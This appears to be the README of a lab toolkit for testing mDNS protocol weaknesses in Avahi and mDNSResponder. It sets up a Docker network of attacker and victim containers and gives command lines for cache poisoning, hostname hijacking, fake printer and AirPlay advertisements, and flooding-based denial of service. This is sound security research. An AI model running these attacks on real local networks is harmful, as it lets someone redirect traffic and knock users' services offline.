# mDNS Security Testing Toolkit

Attack toolkit for testing mDNS (Multicast DNS) protocol vulnerabilities documented in `../mDNS_Attacks.md`. Targets Avahi (Linux) and mDNSResponder (macOS) implementations.

## Quick Start

```bash
# Build and start the lab (1 attacker + 3 victims running Avahi)
docker-compose up -d

# Exec into the attacker
docker exec -it mdns-attacker bash

# Run any attack
python3 /toolkit/mdns_toolkit.py <attack> [options]
```

## Lab Network

| Container | Hostname | IP | Role |
|---|---|---|---|
| mdns-attacker | attacker | 172.20.0.99 | Attack node (Python toolkit) |
| mdns-victim1 | fileserver | 172.20.0.2 | Avahi victim with printer/SSH/HTTP |
| mdns-victim2 | workstation | 172.20.0.3 | Avahi victim with printer/SSH/HTTP |
| mdns-victim3 | laptop | 172.20.0.4 | Avahi victim (observer/resolver) |

All victims run Avahi with `check-response-ttl=no` (the default) and publish printer, SSH, and HTTP services.

## Attacks

### `recon` - Passive Reconnaissance
Zero packets sent. Maps all hosts, IPs, services, and query patterns.
```bash
python3 /toolkit/mdns_toolkit.py recon --duration 30
```

### `poison` - Cache Poisoning
Inject arbitrary A records into all hosts' caches via unsolicited multicast responses.
```bash
# One-shot: poison fileserver.local to resolve to attacker
python3 /toolkit/mdns_toolkit.py poison --name fileserver.local. --ip 172.20.0.99

# Continuous: keep re-announcing
python3 /toolkit/mdns_toolkit.py poison --name fileserver.local. --ip 172.20.0.99 --mode continuous

# Reactive: wait for queries, then respond with poison
python3 /toolkit/mdns_toolkit.py poison --name fileserver.local. --ip 172.20.0.99 --mode reactive
```

### `flush` - Cache-Flush Takeover
Single-packet replacement of any cached record network-wide using the cache-flush bit.
```bash
# Take over a hostname
python3 /toolkit/mdns_toolkit.py flush --name workstation.local. --ip 172.20.0.99

# Full service takeover (SRV + TXT + A in one packet)
python3 /toolkit/mdns_toolkit.py flush \
    --name evil.local. --ip 172.20.0.99 \
    --service-name "fileserver Printer._ipp._tcp.local." \
    --port 9999 --txt "ty=Evil Printer"
```

### `goodbye` - Forced Cache Eviction
Send TTL=0 responses to force record deletion from all caches.
```bash
# Evict a record
python3 /toolkit/mdns_toolkit.py goodbye --name laptop.local. --current-ip 172.20.0.4

# Evict and replace in one step
python3 /toolkit/mdns_toolkit.py goodbye --name laptop.local. --current-ip 172.20.0.4 --new-ip 172.20.0.99

# Flood goodbyes (sustained DoS)
python3 /toolkit/mdns_toolkit.py goodbye --name laptop.local. --current-ip 172.20.0.4 --flood
```

### `hijack` - Name Hijacking
Force a victim to give up its hostname via conflict resolution gaming.
```bash
# Full steal: conflict + probe + announce
python3 /toolkit/mdns_toolkit.py hijack --name fileserver.local. --ip 172.20.0.250

# Just inject a conflict
python3 /toolkit/mdns_toolkit.py hijack --name fileserver.local. --ip 172.20.0.250 --mode conflict

# Exhaust: block all re-registration attempts
python3 /toolkit/mdns_toolkit.py hijack --name fileserver.local. --ip 172.20.0.250 --mode exhaust
```

### `service-poison` - Fake Service Injection
Advertise fake services (printers, AirPlay, SSH, etc.) that appear in service browsers.
```bash
# Fake printer
python3 /toolkit/mdns_toolkit.py service-poison --template printer --hostname evil --ip 172.20.0.99

# Fake AirPlay receiver
python3 /toolkit/mdns_toolkit.py service-poison --template airplay --hostname evil --ip 172.20.0.99

# All services at once
python3 /toolkit/mdns_toolkit.py service-poison --hostname evil --ip 172.20.0.99 --mass

# Templates: printer, airplay, smb, ssh, http, airdrop, chromecast, raop
```

### `probe-dos` - Probe Suppression
Block new mDNS name registrations by conflicting every probe.
```bash
# Block ALL probes network-wide
python3 /toolkit/mdns_toolkit.py probe-dos --ip 172.20.0.250

# Block probes for a specific name
python3 /toolkit/mdns_toolkit.py probe-dos --ip 172.20.0.250 --target fileserver.local.
```

### `tc-flood` - Response Suppression
Flood TC (truncated) bit packets to suppress ALL mDNS responses.
```bash
python3 /toolkit/mdns_toolkit.py tc-flood --duration 60 --interval 0.2
```

### `suppress` - Answer Suppression / POOF
Silence legitimate responders via duplicate answer suppression, or trigger POOF eviction.
```bash
# Race to answer before the real host
python3 /toolkit/mdns_toolkit.py suppress --name fileserver.local. --ip 172.20.0.99 --real-ip 172.20.0.2

# POOF: send unanswered queries to trigger cache eviction
python3 /toolkit/mdns_toolkit.py suppress --name fileserver.local. --ip 172.20.0.99 --mode poof
```

## Validation

```bash
# Run all tests against the Docker lab
./validate.sh

# Run a specific test
./validate.sh poison
```

## Architecture

```
toolkit/
  mdns_core.py          # Packet crafting, socket management, parser
  mdns_toolkit.py       # CLI dispatcher
  attacks/
    recon.py            # Passive reconnaissance
    poison.py           # Cache poisoning (unsolicited responses)
    flush.py            # Cache-flush bit takeover
    goodbye.py          # Goodbye packet abuse
    hijack.py           # Name hijacking via conflicts
    service_poison.py   # Fake service injection
    probe_dos.py        # Probe suppression
    tc_flood.py         # TC-bit response suppression
    suppress.py         # Answer suppression / POOF
  victim/
    avahi-daemon.conf   # Victim Avahi configuration
    start.sh            # Victim startup (dbus + avahi + services)
  docker-compose.yml    # Lab environment
  Dockerfile.attacker   # Attacker image (Python + net tools)
  Dockerfile.victim     # Victim image (Ubuntu + Avahi)
  validate.sh           # Automated test suite
```

No external Python dependencies. All packet crafting is done with `struct` and `socket` from the standard library.
